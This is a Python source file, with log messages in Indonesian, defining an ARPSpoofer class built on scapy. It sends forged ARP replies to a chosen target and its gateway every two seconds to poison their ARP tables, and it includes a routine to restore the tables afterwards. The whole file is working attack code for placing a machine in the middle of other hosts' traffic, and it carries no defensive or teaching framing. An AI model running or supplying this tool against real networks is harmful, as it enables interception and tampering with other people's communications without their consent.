import scapy.all as scapy
import time
from utils.logger import logger
from utils.network_ops import get_mac

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = get_mac(target_ip)
        self.gateway_mac = get_mac(gateway_ip)
        self.is_running = False

    def spoof(self, target_ip, gateway_ip, target_mac):
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        scapy.send(packet, verbose=False)

    def restore(self):
        logger.info("Memulihkan tabel ARP target...")
        packet1 = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        packet2 = scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
        scapy.send(packet1, count=4, verbose=False)
        scapy.send(packet2, count=4, verbose=False)
        logger.info("Tabel ARP berhasil dipulihkan dengan aman.")

    def run(self):
        if not self.target_mac or not self.gateway_mac:
            logger.error("Gagal mendapatkan MAC Address. Pastikan IP valid dan host hidup.")
            return

        self.is_running = True
        logger.info(f"Memulai ARP Spoofing -> Target: {self.target_ip} | Gateway: {self.gateway_ip}")
        
        try:
            while self.is_running:
                self.spoof(self.target_ip, self.gateway_ip, self.target_mac)
                self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
                time.sleep(2)
        except Exception as e:
            logger.error(f"Error pada modul ARP: {e}")